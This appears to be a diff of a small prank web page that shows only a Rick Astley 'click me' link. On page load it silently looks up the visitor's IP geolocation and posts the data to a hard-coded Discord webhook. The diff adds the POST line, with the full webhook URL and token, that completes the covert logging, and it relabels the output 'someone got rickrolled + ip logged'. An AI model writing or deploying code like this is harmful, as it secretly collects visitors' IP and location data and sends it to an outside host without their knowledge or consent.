@@ -8,11 +8,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script>
         $.getJSON('https://json.geoiplookup.io/?callback=?', function ipLogger(data) {
-  console.log(JSON.stringify(data, null, 2));
-
-
-
     const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1075733573665046599/NO3uarnskuacKfY1XWtLBZnnkA4r1zLFxgeNNrzELdfrDmtliFnnFQIU6fSzqp44Cj2j");
   
     request.setRequestHeader('Content-type', 'application/json');
   
@@ -31,17 +28,16 @@
   
   
     const params = {
-      username:'ip logger',
+      username:'someone got rickrolled + ip logged',
       avatar_url:"",
       content:(JSON.stringify(data, null, 2))
       
     }
-    request.send(JSON.stringify(params));
-  
+    request.send(JSON.stringify(params))
 });
     </script>
 </head>
 <body>
-    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley">click me please :(</a>
+    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley">click me pwease UwU :(</a>
 </body>
 </html>
